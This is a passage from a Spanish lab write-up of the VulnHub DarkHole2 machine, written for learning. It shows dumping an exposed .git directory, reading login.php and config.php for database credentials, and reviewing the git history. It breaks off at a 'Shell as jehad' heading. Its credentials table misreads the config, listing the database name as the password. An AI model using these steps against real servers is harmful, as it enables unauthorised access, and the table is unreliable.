</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/description <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/logs/refs/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/index <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/refs/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/commit-msg.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/post-update.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/fsmonitor-watchman.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/logs/HEAD <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/pre-merge-commit.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/pre-push.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/pre-commit.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/pre-rebase.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/prepare-commit-msg.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/push-to-checkout.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/pre-receive.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/applypatch-msg.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/update.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/hooks/pre-applypatch.sample <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/logs/refs/heads/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/04/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/refs/tags/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/09/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/4e/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/refs/heads/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/8b/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/9d/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/32/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/8a/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/6e/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/0f/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/7f/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/66/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/49/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/a2/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/93/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/59/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/77/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/b2/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/b6/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/56/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/e6/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/a4/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/pack/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/aa/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/ca/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/c1/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/c9/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/info/ <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/8b/6cd9032d268332de09c64cbe9efa63ace3998e <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/refs/heads/master <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/04/4d8b4fec000778de9fb27726de4f0f56edbd0e <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/4e/b24de5b85be7cf4b2cef3f0cfc83b09a236133 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/6e/4328f5f878ed20c0b68fc8bda2133deadc49a3 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/32/580f7fb8c39cdad6a7f49839cebfe07f597bcf <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/32/d0928f948af8252b0200ff9cac40534bfe230b <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/logs/refs/heads/master <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/8a/0ff67b07eb0cc9b7bed4f9094862c22cab2a7d <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/7f/d95a2f170cb55fbb335a56974689f659e2c383 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/09/04b1923584a0fb0ab31632de47c520db6a6e21 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/66/5001d05a7c0b6428ce22de1ae572c54cba521d <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/a2/0488521df2b427246c0155570f5bfad6936c6c <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/77/c09cf4b905b2c537f0a02bca81c6fbf32b9c9d <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/49/151b46cc957717f5529d362115339d4abfe207 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/9d/ed9bf70f1f63a852e9e4f02df7b6d325e95c67 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/93/9b9aad671e5bcde51b4b5d99b1464e2d52ceaa <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/56/987e1f75e392aae416571b38b53922c49f6e7e <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/59/218997bfb0d8012a918e43bea3e497e68248a9 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/b6/f546da0ab9a91467412383909c8edc9859a363 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/b2/076545503531a2e482a89b84f387e5d44d35c0 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/ca/f37015411ad104985c7dd86373b3a347f71097 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/a4/d900a8d85e8938d3601f3cef113ee293028e10 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/0f/1d821f48a9cf662f285457a5ce9af6b9feb2c4 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/c9/56989b29ad0767edc6cf3a202545927c3d1e76 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/c1/ef127486aa47cd0b3435bca246594a43b559bb <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Fetching http://192.168.64.129/.git/objects/aa/2a5f3aa15bb402f2b90a07d86af57436d64917 <span class=o>[</span>200<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Sanitizing .git/config
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Running git checkout .</span></span></code></pre></div></figure></div><p>Bien ya teniendo esta informaciÃ³n, antes de seguir con ella vamos a buscar otra, vamos a ver la aplicaciÃ³n web:</p><figure><img srcset=data:image/webp;base64,UklGRkYAAABXRUJQVlA4IDoAAADwAQCdASoQAAgAAph8J5ACdAEO03xbEAAA8qIyN2P8Ag97GLhP3+w+tq3rydOAOqbVdJSCDNgAAAAA data-srcset="/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_1910x0_resize_q85_h2_lanczos_3.webp 1910w" data-sizes=auto src=/images/vlh/darkhole2/1_hu3ec39aee146db433b93211c465e41467_1593404_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1910 height=910 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Podemos ver que tiene un Login , vamos a intentar credenciales bÃ¡sicas:</p><figure><img srcset="data:image/webp;base64,UklGRj4AAABXRUJQVlA4IDIAAADQAQCdASoQAAsAAph8J7ACdAEUjFfsAAD+7MixFa1VR3jXp/g0edoHisjsihlzV8LAAA==" data-srcset="/images/vlh/darkhole2/2_hu88328ae3db5b29bb8d320655d3ffafa0_105375_441x0_resize_q85_h2_lanczos_3.webp 441w" data-sizes=auto src=/images/vlh/darkhole2/2_hu88328ae3db5b29bb8d320655d3ffafa0_105375_441x0_resize_q85_bgffffff_lanczos_3.jpg width=441 height=316 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Se ve que pide de un correo electronico, vamos a probar en el campo de la contraseÃ±a aÃ±adir una <code>'</code> a ver si sucede algo fuera de lo normal:</p><figure><img srcset=data:image/webp;base64,UklGRkAAAABXRUJQVlA4IDQAAADQAQCdASoQAAoAAph8J7ACdAEO5RgqgAD+7sq93njjVH39MFiMjtNjfIiwi4bKosRK0AAA data-srcset="/images/vlh/darkhole2/3_hu58f9a57e5c3f0855ef2267e4a64864bc_797809_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/3_hu58f9a57e5c3f0855ef2267e4a64864bc_797809_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/3_hu58f9a57e5c3f0855ef2267e4a64864bc_797809_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/3_hu58f9a57e5c3f0855ef2267e4a64864bc_797809_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/3_hu58f9a57e5c3f0855ef2267e4a64864bc_797809_1196x0_resize_q85_h2_lanczos_3.webp 1196w" data-sizes=auto src=/images/vlh/darkhole2/3_hu58f9a57e5c3f0855ef2267e4a64864bc_797809_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1196 height=731 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Sigue exactamente igualâ€¦ En la web no hay gran cosa, asÃ­ que vamos a ver el <code>git</code>:</p><figure><img srcset=data:image/webp;base64,UklGRigAAABXRUJQVlA4IBwAAAAwAQCdASoQAA4AAph8J6QAA3AA/u+iTbTMfEAA data-srcset="/images/vlh/darkhole2/4_huf3bbaeb1fbde5c78baa7a89598d357f9_28649_380x0_resize_q85_h2_lanczos_3.webp 380w" data-sizes=auto src=/images/vlh/darkhole2/4_huf3bbaeb1fbde5c78baa7a89598d357f9_28649_380x0_resize_q85_bgffffff_lanczos_3.jpg width=380 height=339 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vamos a ver el <code>login.php</code> para ver si hay algo mal configurado y que podamos abusar de el:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>require</span> <span class=s1>&#39;config/config.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$email</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$connect</span><span class=p>,</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$connect</span><span class=p>,</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$check</span> <span class=o>=</span> <span class=nv>$connect</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;select * from users where email=&#39;</span><span class=si>$email</span><span class=s2>&#39; and password=&#39;</span><span class=si>$pass</span><span class=s2>&#39; and id=1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$check</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;userid&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;location:dashboard.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;link rel=&#34;stylesheet&#34; href=&#34;style/login.css&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;script src=&#34;https://kit.fontawesome.com/fe909495a1.js&#34; crossorigin=&#34;anonymous&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;link rel=&#34;stylesheet&#34; href=&#34;Project_1.css&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;title&gt;Home&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;div class=&#34;container&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;h1&gt;ðŸ‘‹ Welcome&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;!-- &lt;a href=&#34;file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/Project_1.html&#34;&gt;&lt;h1&gt;Sign In&lt;/h1&gt;&lt;/a&gt; --&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;!-- &lt;a href=&#34;file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/P2.html&#34;&gt;  &lt;h1&gt;Log In&lt;/h1&gt;&lt;/a&gt; --&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;form action=&#34;&#34; method=&#34;post&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;box&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;i  class=&#34;fas fa-envelope&#34;&gt;&lt;/i&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;input type=&#34;email&#34; name=&#34;email&#34; id=&#34;email&#34;  placeholder=&#34;Enter Your Email&#34; required&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;box&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;i  class=&#34;fas fa-key&#34;&gt;&lt;/i&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;input type=&#34;password&#34; name=&#34;password&#34; id=&#34;password&#34; placeholder=&#34;Enter Your Password&#34; required&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;button id=&#34;btn&#34; name=&#34;button&#34;&gt;Login&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;/body&gt;
</span></span></span></code></pre></div></figure></div><p>Viendo las primeras lineas del cÃ³digo veo que incluye el archivo <code>config.php</code> que se encuentra en el directorio <code>config</code>. Vamos a darle un ojo:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$connect</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=s2>&#34;localhost&#34;</span><span class=p>,</span><span class=s2>&#34;root&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>,</span><span class=s2>&#34;darkhole_2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>..</span><span class=p>]</span></span></span></code></pre></div></figure></div><p>Tenemos unas credenciales:</p><table><thead><tr><th>Username</th><th>Password</th></tr></thead><tbody><tr><td>root</td><td>darkhole_2</td></tr></tbody></table><p>En este caso son las credenciales de acceso a la base de datos, esto nos estÃ¡ chivando que el usuario empleado es <code>root</code> con una posibilidad de tener super privilegios en la base de datos y poder realizar muchas acciones abusando de los privilegios. Pero primero necesitamos encontrar un <code>SQLi</code> . En el cÃ³digo vemos lo que hace con nuestro input:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>[</span><span class=o>..</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nv>$email</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$connect</span><span class=p>,</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$connect</span><span class=p>,</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>..</span><span class=p>]</span></span></span></code></pre></div></figure></div><p>Vemos que nos sanitiza la entrada con <code>mysqli_real_escape_string</code> asÃ­ que por aquÃ­ no puede a ver un <code>SQLi</code>. Vamos a ver los <code>logs</code> del <code>.git</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”Œâ”€â”€<span class=o>(</span>venv<span class=o>)</span>â”€<span class=o>(</span>pylonã‰¿kali<span class=o>)</span>-<span class=o>[</span>~/â€¦/Vulnhub/DarkHole2/content/git<span class=o>]</span>
</span></span><span class=line><span class=cl>â””â”€$ git log
</span></span><span class=line><span class=cl>commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 <span class=o>(</span>HEAD -&gt; master<span class=o>)</span>
</span></span><span class=line><span class=cl>Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Mon Aug <span class=m>30</span> 13:14:32 <span class=m>2021</span> +0300
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    i changed login.php file <span class=k>for</span> more secure
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit a4d900a8d85e8938d3601f3cef113ee293028e10
</span></span><span class=line><span class=cl>Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Mon Aug <span class=m>30</span> 13:06:20 <span class=m>2021</span> +0300
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    I added login.php file with default credentials
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
</span></span><span class=line><span class=cl>Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Mon Aug <span class=m>30</span> 13:02:44 <span class=m>2021</span> +0300
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    First Initialize</span></span></code></pre></div></figure></div><h2 id=shell-as-jehad>Shell as jehad<a href=#shell-as-jehad class=anchor aria-hidden=true>#</a></h2><p>Vemos varios logs, donde en <code>1</code> vemos un correo electrÃ³nico â†’ <code>anmar-v7@hotmail.com</code>. Vamos a ver que se realizÃ³ en ese <code>log</code> ya que comenta que aÃ±adio cosas en el <code>login.php</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”Œâ”€â”€<span class=o>(</span>venv<span class=o>)</span>â”€<span class=o>(</span>pylonã‰¿kali<span class=o>)</span>-<span class=o>[</span>~/â€¦/Vulnhub/DarkHole2/content/git<span class=o>]</span>                                                                                                                    13:31:42 <span class=o>[</span>2/2<span class=o>]</span>
</span></span><span class=line><span class=cl>â””â”€$ git show a4d900a8d85e8938d3601f3cef113ee293028e10
</span></span><span class=line><span class=cl>commit a4d900a8d85e8938d3601f3cef113ee293028e10
</span></span><span class=line><span class=cl>Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
</span></span><span class=line><span class=cl>Date:   Mon Aug <span class=m>30</span> 13:06:20 <span class=m>2021</span> +0300
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    I added login.php file with default credentials
</span></span><span class=line><span class=cl>
